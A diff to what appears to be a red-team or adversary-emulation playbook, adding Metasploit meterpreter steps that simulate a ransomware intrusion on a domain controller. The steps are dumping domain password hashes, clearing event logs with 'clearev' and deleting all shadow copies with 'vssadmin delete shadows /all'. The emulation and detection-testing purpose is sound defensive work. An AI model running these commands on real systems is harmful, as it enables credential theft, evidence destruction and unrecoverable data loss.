@@ -58,7 +58,33 @@ meterpreter > migrate 812
 
 Assumes you have a priveleged shell on domain controller
 ```
+msf6 exploit(multi/handler) > sessions -i N
+[*] Starting interaction with N...
+
 meterpreter > run windows/gather/credentials/domain_hashdump
 ```
 
+## Defense Evasion Clear Logs
 
+Simulate threat actor removing evidence of their intrusion.
+
+```
+msf6 exploit(multi/handler) > sessions -i N
+[*] Starting interaction with N...
+
+meterpreter > clearev
+```
+
+## Impact
+
+Simulate final objectives of when ransomware payload is executed.
+
+```
+meterpreter > shell
+Process 5028 created.
+Channel 6 created.
+Microsoft Windows [Version 10.0.17763.1697]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>vssadmin delete shadows /all
+```
